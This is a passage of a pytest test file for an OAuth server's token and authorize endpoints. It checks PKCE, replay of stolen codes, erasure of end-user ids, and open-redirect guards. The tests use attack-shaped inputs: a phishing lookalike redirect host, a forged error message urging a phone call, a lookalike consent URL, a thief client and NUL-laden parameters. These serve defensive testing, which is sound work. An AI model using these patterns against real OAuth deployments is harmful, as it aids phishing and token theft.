    data = {"grant_type": "authorization_code", "code": code, "client_id": cid,
            "redirect_uri": REDIRECT, "code_verifier": verifier}
    t = client.post("/token", data=data)
    assert t.status_code == 400 and t.json()["error"] == "invalid_grant", t.text
    db.expire_all()
    assert db.get(OAuthGrant, g.id).used_at is not None, "the code is spent"
    assert db.query(AgentApiKey).count() == keys
    again = client.post("/token", data=data)
    assert again.status_code == 400 and again.json()["error"] == "invalid_grant", again.text


# PKCE is the only proof a public client (the ChatGPT and Claude connectors)
# gives the token endpoint, and the check lives in the SDK alone: no test
# presented a wrong code_verifier (the one above repeats the right one), so
# with the SDK's comparison passing every time all of this file stayed green,
# and an intercepted code would have been exchanged (audit of 17 Oct 2026).

def test_a_wrong_code_verifier_gets_no_token(client, db, tenant, session):
    cid, code, _verifier = _a_code(client, db, tenant, session)
    r = client.post("/token", data={"grant_type": "authorization_code", "code": code,
                                    "client_id": cid, "redirect_uri": REDIRECT,
                                    "code_verifier": "not-the-verifier-" + "x" * 40})
    assert r.status_code == 400 and r.json()["error"] == "invalid_grant", r.text
    assert "access_token" not in r.json()
    assert db.query(AgentApiKey).filter(AgentApiKey.oauth_client_id == cid).count() == 0


def test_a_code_presented_by_another_client_gets_no_token(client, db, tenant, session):
    cid, code, verifier = _a_code(client, db, tenant, session)
    thief = _register(client)
    r = client.post("/token", data={"grant_type": "authorization_code", "code": code,
                                    "client_id": thief, "redirect_uri": REDIRECT,
                                    "code_verifier": verifier})
    assert r.status_code == 400 and r.json()["error"] == "invalid_grant", r.text
    assert db.query(AgentApiKey).filter(
        AgentApiKey.oauth_client_id.in_([cid, thief])).count() == 0


# ── a code waiting for its exchange when one of its end users is erased ─────
# (audit of 19 Oct 2026: the code kept the confined list in clear for a day,
# and exchanged after the erasure it minted a key confined to the erased id)

@pytest.fixture
def keyed(monkeypatch):
    from korely_agent import config

    monkeypatch.setenv("SECRET_KEY", "a-long-random-string-for-the-tests")
    config.get_settings.cache_clear()
    yield
    config.get_settings.cache_clear()


def _erase(db, tenant, who):
    from korely_agent.services import facts as agent_facts

    project = projects_service.get_or_create_default_project(db, tenant.id)
    agent_facts.forget_end_user(db, tenant.id, who, project_id=project.id)
    db.expire_all()


def test_a_code_waiting_for_its_exchange_takes_the_pseudonym(client, db, tenant, session, keyed):
    from korely_agent.services import pseudonyms

    cid, code, verifier = _a_code(client, db, tenant, session, users=["maria", "luca"])
    _erase(db, tenant, "maria")
    p = pseudonyms.pseudonym(tenant.id, "maria")
    grant = db.query(OAuthGrant).filter(OAuthGrant.kind == "code", OAuthGrant.client_id == cid).one()
    assert grant.end_users == [p, "luca"], "the code kept the erased id in clear"
    t = client.post("/token", data={"grant_type": "authorization_code", "code": code,
                                    "client_id": cid, "redirect_uri": REDIRECT,
                                    "code_verifier": verifier})
    assert t.status_code == 200, t.text
    assert key_service.verify_api_key(db, t.json()["access_token"]).end_users == ["luca"]


def test_a_code_left_with_nobody_is_spent_by_the_erasure(client, db, tenant, session, keyed):
    """As a key left with nobody else to see is revoked: the code would mint
    a key that sees nobody."""
    cid, code, verifier = _a_code(client, db, tenant, session, users=["maria"])
    _erase(db, tenant, "maria")
    t = client.post("/token", data={"grant_type": "authorization_code", "code": code,
                                    "client_id": cid, "redirect_uri": REDIRECT,
                                    "code_verifier": verifier})
    assert t.status_code == 400 and t.json()["error"] == "invalid_grant", t.text
    assert db.query(AgentApiKey).filter(AgentApiKey.oauth_client_id == cid).count() == 0


def test_a_code_of_another_project_keeps_its_list(client, db, tenant, session, keyed):
    """Behind the erasure's wall, as the keys' lists are: the same id in
    another project may be another person."""
    cid, _code, _verifier = _a_code(client, db, tenant, session, users=["maria"])
    other = projects_service.create_project(db, tenant_id=tenant.id, name="Other")
    from korely_agent.services import facts as agent_facts

    agent_facts.forget_end_user(db, tenant.id, "maria", project_id=other.id)
    db.expire_all()
    grant = db.query(OAuthGrant).filter(OAuthGrant.kind == "code", OAuthGrant.client_id == cid).one()
    assert grant.end_users == ["maria"] and grant.used_at is None


def test_an_exchange_racing_the_erasure_waits_for_it(client, db, tenant, session, keyed, engine):
    """The erasure holds the code it rewrote until it commits, and the
    exchange spends the code under the same lock: the key gets the list the
    erasure left, never the id read a moment before."""
    import threading

    from sqlalchemy.orm import sessionmaker

    from korely_agent.api import oauth as oauth_api
    from korely_agent.services import pseudonyms

    cid, code, _verifier = _a_code(client, db, tenant, session, users=["maria", "luca"])
    provider = oauth_api.provider()
    info = provider._get_client(cid)
    ac = provider._load_code(info, code)
    project = projects_service.get_or_create_default_project(db, tenant.id)
    eraser = sessionmaker(bind=engine, autoflush=False, expire_on_commit=False)()
    out = {}
    try:
        pseudonyms.after_an_erasure(eraser, tenant.id, "maria", project_id=project.id)
        eraser.flush()
        worker = threading.Thread(target=lambda: out.update(tok=provider._exchange_code(info, ac)))
        worker.start()
        worker.join(1.5)
        assert worker.is_alive(), "the exchange waits for the erasure's commit"
        eraser.commit()
    finally:
        eraser.close()
    worker.join(15)
    db.expire_all()
    assert key_service.verify_api_key(db, out["tok"].access_token).end_users == ["luca"]


@pytest.mark.parametrize("spelled", [" maria", "maria\u0085", "maria\u001f"])
def test_the_consents_row_takes_the_pseudonym_however_the_list_was_spelled(
        client, db, tenant, session, keyed, spelled):
    """Audit of 20 Oct 2026: the consent's trail row recorded the request's
    list, the code held it as `user_scope.checked` stores it (stripped), and
    the erasure rewrote the row by the stored form, which it never contained:
    the id stayed in clear for AUDIT_RETENTION_DAYS."""
    from sqlalchemy import text

    _a_code(client, db, tenant, session, users=[spelled, "luca"])
    _erase(db, tenant, "maria")
    naming = db.execute(text("SELECT count(*) FROM audit_events AS t WHERE t::text LIKE '%maria%'"))
    assert naming.scalar() == 0, "the consent's row kept the erased id"


@pytest.mark.parametrize("uri,host,scheme", [
    ("https://claude.ai/api/mcp/auth_callback", "claude.ai", None),
    ("http://127.0.0.1:8765/cb", "127.0.0.1:8765", None),
    ("ai.claude://claude.ai/api/mcp/auth_callback", None, "ai.claude"),
    ("claude.ai:/api/mcp/auth_callback", None, "claude.ai"),
    ("com.example.app:/oauth2redirect", None, "com.example.app"),
])
def test_an_apps_address_is_never_shown_as_a_web_host(client, db, tenant, session, uri, host, scheme):
    """Audit of 20 Oct 2026: a private-use
    address with an authority, or a dotted scheme spelled as a domain, was
    shown as "claude.ai", the words of the real callback, while the code went
    to whichever app on the device opens that scheme."""
    from korely_agent.db.models import OAuthGrant

    cid = _register(client)
    _verifier, challenge = _pkce()
    consent = urlparse(_authorize(client, cid, challenge).headers["location"])
    request_id = parse_qs(consent.query)["request"][0]
    db.query(OAuthGrant).filter(OAuthGrant.id == uuid.UUID(request_id)).update(
        {OAuthGrant.redirect_uri: uri})
    db.commit()
    shown = client.get(f"/admin/oauth/requests/{request_id}", headers=session).json()
    assert (shown["redirect_host"], shown["redirect_app_scheme"]) == (host, scheme), shown


# ── /authorize sends the browser to the consent page only ────────────────────
# The security review of 12 Nov 2026: the SDK's handler sends its errors back
# to the client's registered redirect URI (RFC 6749 4.1.2.1), registration is
# open to any https address, so scope=admin was a 302 from this server to a
# site anyone registered, with no consent page: RFC 9700 4.11.2, the
# authorization server as an open redirector. api/oauth._OnlyToTheConsentPage.

PHISHING = "https://login-korely.example/cb"


def _register_at(client, redirect):
    r = client.post("/register", json={"client_name": "Totally Korely", "redirect_uris": [redirect],
                                       "token_endpoint_auth_method": "none",
                                       "grant_types": ["authorization_code", "refresh_token"],
                                       "response_types": ["code"]})
    assert r.status_code == 201, r.text
    return r.json()["client_id"]


def _asked(cid, challenge, redirect=PHISHING, **changed):
    params = {"response_type": "code", "client_id": cid, "redirect_uri": redirect,
              "code_challenge": challenge, "code_challenge_method": "S256", "state": "st-9",
              "scope": "memories:read", "resource": "https://memory.example/mcp"}
    params.update(changed)
    return {k: v for k, v in params.items() if v is not None}


@pytest.mark.parametrize("changed, error", [
    ({"scope": "admin"}, "invalid_scope"),
    ({"scope": "memories:read admin"}, "invalid_scope"),
    ({"code_challenge": None}, "invalid_request"),
    ({"code_challenge_method": "plain"}, "invalid_request"),
    ({"response_type": "token"}, "unsupported_response_type"),
    ({"resource": "https://elsewhere.example/mcp"}, "invalid_request"),
    ({"state": "s" * 5000}, "invalid_request"),
    ({"state": "a\x00b"}, "invalid_request"),
], ids=["admin", "admin-among-others", "no-challenge", "plain-challenge", "implicit",
        "other-resource", "long-state", "nul-state"])
@pytest.mark.parametrize("method", ["GET", "POST"])
def test_an_erroneous_request_is_answered_here_never_at_the_apps_address(client, db, changed,
                                                                         error, method):
    cid = _register_at(client, PHISHING)
    _v, challenge = _pkce()
    params = _asked(cid, challenge, **changed)
    r = (client.get("/authorize", params=params, follow_redirects=False) if method == "GET" else
         client.post("/authorize", data=params, follow_redirects=False))
    assert "location" not in r.headers, r.headers["location"]
    assert db.query(OAuthGrant).filter(OAuthGrant.kind == "request").count() == 0
    if method == "GET" and any("\x00" in str(v) for v in changed.values()):
        # A NUL in a query parameter: the rule of every door answers first.
        assert r.status_code == 422, r.text
        return
    assert r.status_code == 400, r.text
    assert r.json()["error"] == error and r.headers["cache-control"] == "no-store"


def test_the_apps_own_query_is_not_said_as_this_servers_words(client, db):
    """A redirect URI registered with `error` and `error_description` of its
    own: the answer is the SDK's error, never the client's text."""
    cid = _register_at(client, PHISHING + "?error=access_denied&error_description=call+0800")
    _v, challenge = _pkce()
    r = client.get("/authorize", params=_asked(cid, challenge, scope="admin",
                                                redirect=PHISHING + "?error=access_denied"
                                                                    "&error_description=call+0800"),
                   follow_redirects=False)
    assert r.status_code == 400 and r.json()["error"] == "invalid_scope"
    assert "0800" not in r.text


def test_a_valid_request_still_goes_to_the_consent_page_and_only_then_to_the_app(
        client, db, tenant, session):
    """What stays a redirect: the consent page, whose host the person sees,
    and from there the app (approve, deny) once a person answered."""
    cid = _register_at(client, PHISHING)
    _v, challenge = _pkce()
    r = client.get("/authorize", params=_asked(cid, challenge), follow_redirects=False)
    assert r.status_code == 302
    consent = urlparse(r.headers["location"])
    assert (consent.netloc, consent.path) == ("memory.example", "/oauth/consent")
    request_id = parse_qs(consent.query)["request"][0]
    shown = client.get(f"/admin/oauth/requests/{request_id}", headers=session).json()
    assert "login-korely.example" in str(shown)
    r = client.post(f"/admin/oauth/requests/{request_id}/deny", headers=session)
    assert r.json()["redirect"].startswith(PHISHING + "?error=access_denied")


def test_the_consent_page_is_the_one_chosen_for_this_request(client, db, monkeypatch):
    """Only the address the provider chose for this very request passes,
    never one that looks like it: a client registered with the consent
    page's own address, plus a request id, is still answered here."""
    lookalike = "https://memory.example/oauth/consent?request=00000000-0000-0000-0000-000000000000"
    cid = _register_at(client, lookalike)
    _v, challenge = _pkce()
    r = client.get("/authorize", params=_asked(cid, challenge, redirect=lookalike, scope="admin"),
                   follow_redirects=False)
    assert r.status_code == 400 and r.json()["error"] == "invalid_scope"


def test_an_install_whose_address_the_redirect_quotes_still_reaches_the_consent(db, monkeypatch):
    """PUBLIC_BASE_URL with an IDN host: the SDK's RedirectResponse quotes
    the consent page's address, and the guard compares it in that same
    spelling (the review of 12 Nov 2026: every valid request was a 400)."""
    from fastapi.testclient import TestClient

    from korely_agent import config
    from korely_agent.db import get_db
    from korely_agent.main import create_app
    from korely_agent.mcp import server as mcp_server

    monkeypatch.setenv("RUN_WORKER", "false")
    monkeypatch.setenv("PUBLIC_BASE_URL", "https://b\u00fccher.example")
    monkeypatch.setattr(mcp_server, "_agent_mcp_singleton", None)
    monkeypatch.setattr(mcp_server, "_agent_streamable_app_singleton", None)
    config.get_settings.cache_clear()
    try:
        app = create_app()
        app.dependency_overrides[get_db] = lambda: db
        with TestClient(app, base_url="https://memory.example") as c:
            cid = _register_at(c, PHISHING)
            _v, challenge = _pkce()
            ok = c.get("/authorize", params=_asked(cid, challenge, resource=None),
                       follow_redirects=False)
            bad = c.get("/authorize", params=_asked(cid, challenge, resource=None, scope="admin"),
                        follow_redirects=False)
        app.dependency_overrides.clear()
    finally:
        config.get_settings.cache_clear()
    assert ok.status_code == 302, ok.text
    assert urlparse(ok.headers["location"]).path == "/oauth/consent"
    assert "request" in parse_qs(urlparse(ok.headers["location"]).query)
    assert bad.status_code == 400 and "location" not in bad.headers
